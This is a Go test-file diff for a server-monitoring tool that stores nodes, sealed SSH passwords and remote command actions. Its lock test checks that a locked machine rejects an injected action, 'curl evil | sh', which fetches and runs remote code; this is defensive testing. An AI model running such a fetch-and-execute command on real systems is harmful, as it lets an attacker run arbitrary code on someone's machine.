@@ -7,7 +7,7 @@ import (
 	"testing"
 	"time"
 
-	"github.com/mirairoad/guard/internal/telemetry/model"
+	"github.com/hushkey-app/guard/internal/telemetry/model"
 )
 
 func TestNodeLifecycle(t *testing.T) {
@@ -305,5 +305,530 @@ func TestClusterSummary(t *testing.T) {
 	}
 	if summary.Worst != "B-down" {
 		t.Errorf("worst = %q, want the failing node", summary.Worst)
+	}
+}
+
+func TestNodeAddressesComposeTheProbeURL(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	// The health path hangs off the address the service answers on. The SSH
+	// host is a way in, not a health check, and must not attract the path.
+	node, err := store.SaveNode(Node{
+		Name: "VPS-1", Domain: "http://localhost:8000", HealthPath: "/api/health",
+		SSHAddress: "root@10.10.182.113", Enabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if node.URL != "http://localhost:8000/api/health" {
+		t.Fatalf("probing %q, want the address with the health path", node.URL)
+	}
+
+	node.Domain = "https://vps-1.example.com"
+	public, err := store.SaveNode(node)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if public.URL != "https://vps-1.example.com/api/health" {
+		t.Fatalf("probing %q, want the new address with the same health path", public.URL)
+	}
+
+	// A machine stored before the split keeps being probed where it was.
+	legacy, err := store.SaveNode(Node{
+		Name: "VPS-0", InternalURL: "http://10.10.10.10:8000", HealthPath: "/healthz", Enabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if legacy.URL != "http://10.10.10.10:8000/healthz" {
+		t.Fatalf("probing %q, want the old internal address", legacy.URL)
+	}
+
+	if _, err := store.SaveNode(Node{Name: "nowhere", Enabled: true}); err == nil {
+		t.Error("a machine with no address at all was accepted")
+	}
+	if _, err := store.SaveNode(Node{Name: "bad path", Domain: "https://x.example.com", HealthPath: "api/health"}); err == nil {
+		t.Error("a health path that is not a path was accepted")
+	}
+	if _, err := store.SaveNode(Node{Name: "bad ssh", Domain: "https://x.example.com", SSHAddress: "10.10.10.10"}); err == nil {
+		t.Error("an ssh address with no user was accepted")
+	}
+}
+
+func TestPasswordIsSealedAndNeverRead(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	password := "hunter2"
+	node, err := store.SaveNode(Node{
+		Name: "VPS-1", InternalURL: "http://10.10.10.10:8000",
+		SSHAddress: "root@10.10.10.10", Password: &password, Enabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !node.HasPassword {
+		t.Fatal("a machine given a password does not say it has one")
+	}
+	// The read path says a password exists and cannot carry it.
+	if node.Password != nil {
+		t.Error("the password came back out of the store")
+	}
+
+	login, err := store.SSHLoginFor(node.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if login.User != "root" || login.Address != "10.10.10.10:22" || login.Password != password {
+		t.Fatalf("login is %+v", login)
+	}
+
+	// An edit that says nothing about the password keeps it.
+	node.Name = "VPS-1 (eu)"
+	kept, err := store.SaveNode(node)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !kept.HasPassword {
+		t.Error("renaming a machine lost its password")
+	}
+
+	// An empty one forgets it, which is a different request from silence.
+	empty := ""
+	kept.Password = &empty
+	cleared, err := store.SaveNode(kept)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if cleared.HasPassword {
+		t.Error("the password was not forgotten")
+	}
+}
+
+func TestActionsAreEditedAsAList(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "VPS-1", InternalURL: "http://10.10.10.10:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	saved, err := store.SaveActions(node.ID, []model.NodeAction{
+		{Name: "Reboot", Command: "sudo reboot"},
+		{Name: "Update", Command: "apt-get update && apt-get upgrade -y"},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(saved) != 2 || saved[0].Name != "Reboot" {
+		t.Fatalf("saved %+v", saved)
+	}
+
+	// Running one is remembered on it, so a button can say how it went.
+	if err := store.RecordRun(saved[0].ID, model.Run{ExitCode: 1, RanAt: time.Now().UTC()}); err != nil {
+		t.Fatal(err)
+	}
+	// Editing by id keeps that record; the alternative — rewriting the list
+	// wholesale — would forget it on every keystroke that reaches the server.
+	edited, err := store.SaveActions(node.ID, []model.NodeAction{
+		{ID: saved[0].ID, Name: "Reboot", Command: "sudo reboot now"},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(edited) != 1 || edited[0].Command != "sudo reboot now" {
+		t.Fatalf("edited %+v", edited)
+	}
+	if edited[0].LastExit != 1 || edited[0].LastError == "" {
+		t.Errorf("editing an action forgot how it last ran: %+v", edited[0])
+	}
+
+	if _, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "", Command: "true"}}); err == nil {
+		t.Error("an action with no name was accepted")
+	}
+
+	// The node carries them, so the settings page reads a cluster in one go.
+	reread, err := store.Node(node.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(reread.Actions) != 1 {
+		t.Fatalf("node carries %d actions", len(reread.Actions))
+	}
+}
+
+func TestLockingFinishesTheCommandList(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	password := "hunter2"
+	node, err := store.SaveNode(Node{
+		Name: "VPS-1", Domain: "https://vps-1.example.com",
+		SSHAddress: "root@10.10.10.10", Password: &password, Enabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	actions, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Reboot", Command: "sudo reboot"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	node.Locked = true
+	locked, err := store.SaveNode(node)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !locked.Locked {
+		t.Fatal("the machine did not lock")
+	}
+
+	// The whole list is finished: not added to, not edited, not removed. The
+	// add is the one that matters — it is enough to get any command at all onto
+	// somebody's machine.
+	for name, list := range map[string][]model.NodeAction{
+		"an extra action":  {{ID: actions[0].ID, Name: "Reboot", Command: "sudo reboot"}, {Name: "Sneaky", Command: "curl evil | sh"}},
+		"an edited action": {{ID: actions[0].ID, Name: "Reboot", Command: "curl evil | sh"}},
+		"a removal":        {},
+	} {
+		if _, err := store.SaveActions(node.ID, list); err == nil {
+			t.Errorf("a locked machine accepted %s", name)
+		}
+	}
+
+	// The login is frozen with it.
+	moved := locked
+	moved.SSHAddress = "root@10.10.10.11"
+	if _, err := store.SaveNode(moved); err == nil {
+		t.Error("a locked machine let its ssh address be changed")
+	}
+	other := "letmein"
+	changed := locked
+	changed.Password = &other
+	if _, err := store.SaveNode(changed); err == nil {
+		t.Error("a locked machine let its password be changed")
+	}
+
+	// One way, from anywhere. The only way past it is deleting the machine.
+	unlocking := locked
+	unlocking.Locked = false
+	still, err := store.SaveNode(unlocking)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !still.Locked {
+		t.Error("the lock came off")
+	}
+
+	// Renaming, repathing and pausing still work: none of them can run
+	// anything, and the commands that exist can still be run.
+	renamed := still
+	renamed.Name, renamed.Enabled, renamed.HealthPath = "VPS-1 (eu)", false, "/healthz"
+	if _, err := store.SaveNode(renamed); err != nil {
+		t.Errorf("a locked machine could not be renamed: %v", err)
+	}
+	if err := store.DeleteNode(node.ID); err != nil {
+		t.Errorf("a locked machine could not be deleted: %v", err)
+	}
+}
+
+func TestDuplicateCopiesTheShapeAndNotTheLogin(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	password := "hunter2"
+	node, err := store.SaveNode(Node{
+		Name: "VPS-1", Domain: "https://vps-1.example.com", HealthPath: "/api/health",
+		SSHAddress: "root@10.10.10.10", Password: &password,
+		IntervalSeconds: 30, Enabled: true,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	stored, err := store.SaveActions(node.ID, []model.NodeAction{
+		{Name: "Reboot", Command: "sudo reboot"},
+		{Name: "Update", Command: "apt-get update && apt-get upgrade -y"},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := store.RecordRun(stored[0].ID, model.Run{ExitCode: 0, RanAt: time.Now().UTC()}); err != nil {
+		t.Fatal(err)
+	}
+	// Locked last, the way it happens: configure the machine, then close it.
+	node.Locked = true
+	if _, err := store.SaveNode(node); err != nil {
+		t.Fatal(err)
+	}
+
+	copied, err := store.DuplicateNode(node.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if copied.Name != "VPS-1 copy" {
+		t.Errorf("copy is called %q", copied.Name)
+	}
+	if copied.Domain != node.Domain || copied.HealthPath != node.HealthPath || copied.IntervalSeconds != 30 {
+		t.Errorf("the shape did not come across: %#v", copied)
+	}
+	if len(copied.Actions) != 2 || copied.Actions[1].Command != "apt-get update && apt-get upgrade -y" {
+		t.Fatalf("actions are %+v", copied.Actions)
+	}
+	if copied.Actions[0].ID == stored[0].ID {
+		t.Error("the copy shares its action rows with the original")
+	}
+	// A login proved against one box proves nothing about another, and the copy
+	// has never run anything.
+	if copied.SSHAddress != "" || copied.HasPassword {
+		t.Errorf("the login was copied: %q has_password=%v", copied.SSHAddress, copied.HasPassword)
+	}
+	if copied.Locked {
+		t.Error("the copy arrived locked")
+	}
+	if copied.Enabled {
+		t.Error("the copy arrived checking the machine it was copied from")
+	}
+	if !copied.Actions[0].LastRunAt.IsZero() {
+		t.Error("the copy claims to have run something")
+	}
+
+	// A second press does not collide.
+	again, err := store.DuplicateNode(node.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if again.Name != "VPS-1 copy 2" {
+		t.Errorf("the second copy is called %q", again.Name)
+	}
+}
+
+func TestSchedulesAndRunHistory(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	saved, err := store.SaveActions(node.ID, []model.NodeAction{
+		{Name: "Dump to R2", Command: "pg_dump ... | rclone rcat r2:backups/db.sql.gz",
+			Schedule: "0 */6 * * *", StaleAfterSeconds: int((7 * time.Hour).Seconds())},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	action := saved[0]
+	if action.Schedule != "0 */6 * * *" || action.StaleAfterSeconds == 0 {
+		t.Fatalf("saved %+v", action)
+	}
+	if action.NextRunAt.IsZero() || !action.NextRunAt.After(time.Now()) {
+		t.Fatalf("next run = %s, want a time ahead", action.NextRunAt)
+	}
+	if action.CreatedAt.IsZero() {
+		t.Fatal("an action with a staleness budget needs an anchor for having never succeeded")
+	}
+
+	// A run that failed: remembered on the action, and in the history.
+	failed := model.Run{
+		Command: action.Command, ExitCode: 1, RanAt: time.Now().UTC(),
+		Trigger: model.TriggerSchedule, Output: "connection refused",
+	}
+	if err := store.RecordRun(action.ID, failed); err != nil {
+		t.Fatal(err)
+	}
+	reread, err := store.Action(action.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if reread.LastExit != 1 || !reread.LastOKAt.IsZero() {
+		t.Fatalf("a failure is not a success: %+v", reread)
+	}
+
+	// A success moves the separate last-success mark, which is what the
+	// staleness watch reads.
+	if err := store.RecordRun(action.ID, model.Run{RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule}); err != nil {
+		t.Fatal(err)
+	}
+	reread, err = store.Action(action.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if reread.LastOKAt.IsZero() {
+		t.Fatal("a successful run was not remembered as one")
+	}
+
+	runs, err := store.Runs(node.ID, 0, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(runs) != 2 {
+		t.Fatalf("history has %d rows, want both runs", len(runs))
+	}
+	// Newest first, and each row knows what it was.
+	if runs[0].Result() != model.OutcomeOK || runs[1].Result() != model.OutcomeFailed {
+		t.Fatalf("history = %+v", runs)
+	}
+	if runs[0].ActionName != "Dump to R2" || runs[0].Trigger != model.TriggerSchedule {
+		t.Fatalf("history row = %+v", runs[0])
+	}
+}
+
+func TestAScheduledActionIsReadBackByTheScheduler(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := store.SaveActions(node.ID, []model.NodeAction{
+		{Name: "Dump", Command: "pg_dump", Schedule: "@every 6h"},
+		{Name: "Reboot", Command: "sudo reboot"},
+	}); err != nil {
+		t.Fatal(err)
+	}
+	scheduled, err := store.ScheduledActions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(scheduled) != 1 || scheduled[0].Name != "Dump" {
+		t.Fatalf("scheduled = %+v, want only the one carrying a schedule", scheduled)
+	}
+
+	// Pausing the machine stops its schedules, the same switch that stops its
+	// health checks: a box being worked on is the last one that should have a
+	// backup job opening sessions into it.
+	if _, err := store.SaveNode(Node{ID: node.ID, Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: false}); err != nil {
+		t.Fatal(err)
+	}
+	scheduled, err = store.ScheduledActions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(scheduled) != 0 {
+		t.Fatalf("a paused machine still scheduled %d commands", len(scheduled))
+	}
+}
+
+func TestASkippedRunIsRecordedWithoutBecomingTheLastRun(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	saved, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Dump", Command: "pg_dump", Schedule: "@every 6h"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	action := saved[0]
+	if err := store.RecordRun(action.ID, model.Run{
+		RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule,
+		Outcome: model.OutcomeSkipped, Error: "the previous run was still going",
+	}); err != nil {
+		t.Fatal(err)
+	}
+	reread, err := store.Action(action.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// A skip never happened: letting it stand as the last run would push the
+	// next fire a whole period away, which is the opposite of what a job that
+	// is running long needs.
+	if !reread.LastRunAt.IsZero() {
+		t.Fatalf("a skipped run became the last run: %s", reread.LastRunAt)
+	}
+	runs, err := store.Runs(0, action.ID, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(runs) != 1 || runs[0].Outcome != model.OutcomeSkipped {
+		t.Fatalf("history = %+v, want the skip on the record", runs)
+	}
+}
+
+func TestRunHistoryIsKeptToASize(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	saved, err := store.SaveActions(node.ID, []model.NodeAction{{Name: "Dump", Command: "pg_dump"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for i := 0; i < runRetention+10; i++ {
+		if err := store.RecordRun(saved[0].ID, model.Run{RanAt: time.Now().UTC(), Trigger: model.TriggerSchedule}); err != nil {
+			t.Fatal(err)
+		}
+	}
+	runs, err := store.Runs(0, saved[0].ID, 200)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(runs) != runRetention {
+		t.Fatalf("history kept %d rows, want %d", len(runs), runRetention)
+	}
+
+	// And removing the command takes its history with it: rows nothing can
+	// read are rows nobody asked to keep.
+	if _, err := store.SaveActions(node.ID, nil); err != nil {
+		t.Fatal(err)
+	}
+	runs, err = store.Runs(node.ID, 0, 200)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(runs) != 0 {
+		t.Fatalf("history outlived its command: %d rows", len(runs))
+	}
+}
+
+func TestAlertFlagClearsOnTheNextSuccess(t *testing.T) {
+	store := NewStore(100)
+	t.Cleanup(func() { store.Close() })
+
+	node, err := store.SaveNode(Node{Name: "DB-1", InternalURL: "http://10.19.96.4:8000", Enabled: true})
+	if err != nil {
+		t.Fatal(err)
+	}
+	saved, err := store.SaveActions(node.ID, []model.NodeAction{
+		{Name: "Dump", Command: "pg_dump", StaleAfterSeconds: 3600},
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	watched, err := store.WatchedActions()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(watched) != 1 {
+		t.Fatalf("watched %d actions, want the one with a threshold", len(watched))
+	}
+	if err := store.MarkAlerted(saved[0].ID, time.Now()); err != nil {
+		t.Fatal(err)
+	}
+	reread, err := store.Action(saved[0].ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if reread.AlertedAt.IsZero() {
+		t.Fatal("the alert was not recorded")
+	}
+	// A job that comes back should be able to alert again the next time it
+	// goes away.
+	if err := store.RecordRun(saved[0].ID, model.Run{RanAt: time.Now().UTC()}); err != nil {
+		t.Fatal(err)
+	}
+	reread, err = store.Action(saved[0].ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !reread.AlertedAt.IsZero() {
+		t.Fatal("a success left the alert flag standing")
 	}
 }
